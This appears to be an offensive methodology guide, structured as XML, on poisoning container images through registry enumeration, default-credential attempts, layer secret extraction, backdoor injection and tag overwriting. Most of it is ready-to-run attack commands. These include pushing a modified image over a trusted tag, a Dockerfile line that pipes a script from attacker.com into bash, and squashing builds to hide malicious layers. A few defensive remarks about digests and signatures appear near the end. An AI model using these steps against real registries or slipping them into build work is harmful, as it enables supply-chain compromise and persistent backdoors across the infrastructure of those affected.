<vulnerability_guide>
  <title>CONTAINER IMAGE POISONING</title>

  <critical>Container images are the foundation of cloud-native deployments. Poisoning container images affects every container instance deployed from them. Registry compromise, base image manipulation, and build process attacks can inject persistent backdoors that survive redeployments and scale across entire infrastructures.</critical>

  <scope>
    - Registry access and manipulation
    - Base image supply chain attacks
    - Layer manipulation and injection
    - Tag mislabeling attacks
    - Build process exploitation
    - Image signature bypass
  </scope>

  <methodology>
    1. REGISTRY ENUMERATION
       {% raw %}
       # Find container registries
       # Common registry URLs:
       # - registry.company.com
       # - docker.company.com
       # - harbor.company.com
       # - gcr.io/project-id
       # - ACCOUNT.dkr.ecr.REGION.amazonaws.com

       # Test for unauthenticated access
       curl -s https://registry.target.com/v2/_catalog
       curl -s https://registry.target.com/v2/app/tags/list

       # Check for default credentials
       # Harbor: admin/Harbor12345
       # Nexus: admin/admin123

       # Docker Hub enumeration
       curl -s "https://hub.docker.com/v2/repositories/target/?page_size=100"
       {% endraw %}

    2. IMAGE ANALYSIS
       {% raw %}
       # Pull and analyze image
       docker pull target.com/app:latest

       # Extract layers
       docker save target.com/app:latest -o image.tar
       tar -xf image.tar

       # Analyze each layer
       for layer in */layer.tar; do
         tar -tf "$layer" | head -20
       done

       # Check for secrets in layers
       # Even if removed in later layers, still present in history
       docker history --no-trunc target.com/app:latest

       # Dive tool for layer analysis
       dive target.com/app:latest
       {% endraw %}

    3. IMAGE MANIPULATION
       {% raw %}
       # Modify existing image
       # Add malicious layer
       docker run -it target.com/app:latest /bin/sh
       # Make changes (add backdoor, modify files)
       docker commit <container_id> target.com/app:latest

       # Push modified image
       docker push target.com/app:latest

       # Layer injection
       # Create malicious layer
       FROM target.com/app:latest
       RUN curl https://attacker.com/backdoor.sh | bash
       # Build and push with same tag

       # Squash attack
       # Flatten image to hide malicious layer history
       docker build --squash -t target.com/app:latest .
       {% endraw %}

    4. BASE IMAGE ATTACKS
       {% raw %}
       # Base image supply chain

       # Check what base images are used
       grep -r "^FROM" . --include="Dockerfile"

       # Popular targets:
       # - alpine
       # - ubuntu
       # - node
       # - python
       # - golang

       # Attack vectors:
       # 1. Compromise public base image
       # 2. Typosquatting: alphine instead of alpine
       # 3. Internal base image manipulation
       # 4. Version tag manipulation

       # Check image provenance
       docker trust inspect --pretty target.com/app:latest
       {% endraw %}

    5. TAG MANIPULATION
       {% raw %}
       # Tags are mutable by default

       # Overwrite legitimate tag
       docker pull attacker.com/malicious:v1
       docker tag attacker.com/malicious:v1 target.com/app:latest
       docker push target.com/app:latest

       # Version tag confusion
       # Push malicious image as "1.0.1" when "1.0.0" is trusted
       # If using "latest" or "^1.0", malicious version pulled

       # Digest vs tag
       # Digests are immutable
       # target.com/app@sha256:abc123... (safe)
       # target.com/app:latest (can change)
       {% endraw %}
  </methodology>

